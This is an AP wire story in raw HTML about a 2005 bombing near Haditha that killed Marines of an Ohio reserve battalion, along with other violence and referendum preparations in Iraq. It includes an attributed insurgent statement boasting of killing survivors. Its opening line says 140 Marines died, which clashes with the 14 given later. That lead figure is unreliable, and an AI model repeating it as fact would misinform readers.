   U.S. Marines Killed in Iraq Bombing</B></FONT>

   </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>BAGHDAD, Iraq (AP) - 140 U.S.
   Marines were killed when a huge bomb destroyed their lightly armored vehicle,
   hurling it into the air in a giant fireball in the deadliest roadside bombing
   suffered by American forces in the Iraq war. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>A civilian translator also was
   killed and one Marine was wounded Wednesday. The victims were from the same
   Ohio-based Reserve unit as five of six members of a Marine sniper team killed on
   Monday in an ambush claimed by the Islamic extremist Ansar al-Sunnah Army.
   </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>The deaths brought to 23 the number
   of Marines killed in the past week in fighting along the volatile Euphrates
   Valley of western Iraq and marked one of the bloodiest periods for U.S. forces
   in months. In all, 44 American service members have died in Iraq since July 24 -
   all but two in combat. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>A Marine officer, speaking on
   condition of anonymity for security reasons, said the attack came as troops were
   traveling in an armored amphibious vehicle to assault insurgent positions around
   a village near the Haditha dam, a longtime way station for foreign fighters
   infiltrating Iraq from Syria. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>The Marines killed Wednesday were
   assigned to the 3rd Battalion, 25th Marines based in Brook Park, a Cleveland
   suburb, and attached to the Regimental Combat Team-2. Nine of them were from a
   single smaller unit in Columbus. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>U.S. President George W. Bush
   lamented the deaths of the 14 Marines, calling the attack a ``grim reminder''
   America is still at war. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>U.S. leaders have been pinning
   hopes that political progress towards a constitution and broadly elected
   government will dampen an intransigent insurgency. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>On Thursday, the Interior Ministry
   announced that Iraqi security forces have started a nationwide operation to
   protect voter registration centers for October's constitutional referendum and
   December'sgeneral election. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>Minister Bayan Jabr said the
   month-long operations began Aug. 1. But he acknowledged problems in the tense
   western province of Anbar, where Sunni Muslim insurgents are active and where at
   least 21 U.S. Marines were killed this week. He did not give details of the
   operation or say how many members were taking part of it. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>``All of the southern provinces are
   safe and turnout on registration has been good in the (predominantly Sunni Arab
   areas of) Mosul, Salaheddin and Baqouba,'' he said. ``There are some problems in
   Anbar, especially in Ramadi and some other districts.'' </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>As of Wednesday, 544 registration
   centers were opened throughout the country so that 16 million voters can
   register. Insurgents attacks are not uncommon against elections workers.
   </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>Marines have been fighting for
   months in a string of towns along the Euphrates to try to seal a major
   infiltration route for foreign fighters slipping into Iraq from Syria.
   </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>``This is a very lethal and
   unfortunately very adaptable enemy we are faced with,'' said U.S. Army Brig.
   Gen. Carter Ham, a Pentagon staff officer and former commander of U.S. forces in
   Mosul. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>The Marines stepped up operations
   in May in hopes of pacifying the area so Iraqi military and civilian forces
   could assume effective control. However, government authority in the heavily
   Sunni Arab region is tenuous. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>U.S. officials have long complained
   that American forces seize Sunni areas only to have Iraqi authorities lose them
   again to the insurgents once American troops leave. Despite those complaints,
   the Bush administration is talking about handing more security responsibility to
   the Iraqis and drawing down forces next year. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>At least 1,821 members of the U.S.
   military have died since the Iraq war began in March 2003, according to an
   Associated Press count. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>On Wednesday, the Web site of the
   Ansar al-Sunnah Army posted photographs from Monday's attack on the Marine
   sniper team. One picture shows a bloody, battered body wearing Marine camouflage
   trousers. Another shows two hooded gunmen standing in front of several rifles,
   apparently taken from dead Marines. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>In a statement accompanying the
   photos, Ansar al-Sunnah said the insurgents lured the Marines out of their base
   and ambushed them. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>``The intention was to capture them
   alive, but they opened fire on the mujahedeen,'' the statement said. ``The
   heroes slaughtered those who were still alive ... except for one, who begged the
   mujahedeen for his life. They captured him and he is in our hands.'' </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>At the Pentagon, Ham said no
   Marines were missing and believed captured. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>In Brook Park, the Cleveland suburb
   where the battalion was based, businesses tied red, white and blue ribbons on
   their doors, and some had American flags hanging in the windows. A bouquet of
   red roses was placed at the gate of the Marine headquarters, an old brick
   schoolhouse. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>Among the six killed Monday was
   Cpl. Jeffrey A. Boskovitch, 25, an aspiring police officer who planned to set a
   wedding date with his girlfriend when he returned home this fall. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>A New York City police officer
   serving in the Army Reserve was shot and killed Tuesday by a sniper while
   guarding prisoners at the Camp Victory military base, outside Baghdad, city
   officials said Wednesday. Staff Sgt. James McNaughton, 27, was the first member
   of the police force to be killed in action in Iraq. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>In Basra, 340 miles southeast of
   Baghdad, an American freelance writer was found dead late Tuesday - the first
   U.S. journalist slain in Iraq since the U.S.-led invasion. Steven Vincent of New
   York was shot multiple times hours after he and his Iraqi translator were
   abducted at gunpoint, police said. His translator was seriously wounded.
   </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>According to the New York-based
   Committee to Protect Journalists, at least 46 journalists and 20 media support
   workers have been killed covering the war in Iraq since March 2003. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>In other developments in Iraq
   </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>-An aide to Iraqi politician Ahmad
   Chalabi was assassinated at his home in Baghdad. Police said Haider Mohammed Ali
   al-Dujaili was shot dead about 6 a.m. by gunmen who broke into his home in
   southwestern Baghdad. Al-Dujaili was head of the public relations department in
   Chalabi's office. One of Chalabi's security guards was killed in an ambush
   Sunday south of Baghdad. Chalabi, who is a deputy prime minister, was not in the
   convoy. </FONT></P>
   <P><FONT face=Geneva,Arial,sans-serif size=2>-A car bomb targeted a convoy of
   the Interior Ministry's Wolf Brigade in Daquq 18 miles south of the oil-rich
   city of Kirkuk, killing two soldiers and wounding two, police said. Gunmen
   opened fire on a police patrol earlier in the day, killing three policemen and
   wounding two others. </FONT></P>
